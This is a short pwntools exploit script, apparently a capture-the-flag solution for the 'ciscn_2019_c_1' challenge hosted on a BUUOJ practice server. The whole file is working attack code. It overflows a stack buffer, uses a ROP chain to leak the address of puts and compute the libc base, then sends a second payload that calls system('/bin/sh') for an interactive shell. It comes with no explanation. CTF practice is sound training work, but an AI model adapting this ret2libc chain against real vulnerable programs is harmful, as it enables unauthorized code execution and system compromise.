#Made by fly_autumn
#x64 ret2libc

from pwn import *
#p = process("./ciscn_2019_c_1")
p = remote("node5.buuoj.cn",25279)
elf = ELF("./ciscn_2019_c_1")
libc = ELF("./libc.so.6")
context(os="linux",arch="amd64")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
start_plt = 0x400790
pop_rdi = 0x400c83 
offset = 88
ret = 0x4006b9

p.recvuntil(b"choice!\n")
p.sendline(b"1")
p.recvuntil(b"encrypted\n")
payload = b"\00" + b"A"*(offset-1)+p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_plt)
p.sendline(payload)
p.recvline()
p.recvline()
puts_addr = u64(p.recv(6).ljust(8,b"\0"))
log.success("puts addr: "+hex(puts_addr))
libc_addr = puts_addr - libc.sym["puts"]

log.success("libc addr: "+hex(libc_addr))
sys_addr = libc_addr + libc.sym["system"]
log.success("system addr: "+hex(sys_addr))
sh_addr = libc_addr + next(libc.search(b"/bin/sh"))
log.success("sh addr: "+hex(sh_addr))
p.recvuntil(b"choice!\n")
p.sendline(b"1")
p.recvuntil(b"encrypted\n")
payload = b"\0" + b"A"*(offset-1) + p64(ret) + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)
p.sendline(payload)

p.interactive()
